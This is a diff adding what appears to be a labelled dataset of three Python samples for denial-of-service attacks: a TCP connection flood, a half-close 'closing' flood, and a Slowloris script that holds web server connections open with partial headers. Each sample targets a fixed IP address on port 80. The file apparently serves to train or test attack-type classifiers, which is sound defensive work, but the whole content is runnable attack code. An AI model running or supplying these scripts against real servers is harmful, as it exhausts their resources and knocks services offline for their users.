@@ -1,0 +1,55 @@
+[CLS] connect attack [SEP]
+# Python pseudocode for a Connect attack
+import socket
+
+target_ip = '192.168.1.1'
+target_port = 80
+
+sockets = []
+for _ in range(10000):
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((target_ip, target_port))
+    sockets.append(s)
+[SEP]
+
+[CLS] closing attack [SEP]
+# Python pseudocode for a Closing attack
+import socket
+import time
+
+target_ip = '192.168.1.1'
+target_port = 80
+
+sockets = []
+for _ in range(10000):
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((target_ip, target_port))
+    s.shutdown(socket.SHUT_WR)
+    time.sleep(0.1)
+    sockets.append(s)
+[SEP]
+
+[CLS] slowloris attack [SEP]
+# Python pseudocode for a Slowloris attack
+import socket
+import time
+
+target_ip = '192.168.1.1'
+target_port = 80
+connection_count = 1000
+
+sockets = []
+for _ in range(connection_count):
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((target_ip, target_port))
+    s.send('GET / HTTP/1.1\r\n'.encode('utf-8'))
+    sockets.append(s)
+
+while True:
+    for s in sockets:
+        try:
+            s.send('X-a: b\r\n'.encode('utf-8'))
+        except socket.error:
+            sockets.remove(s)
+    time.sleep(15)
+[SEP]
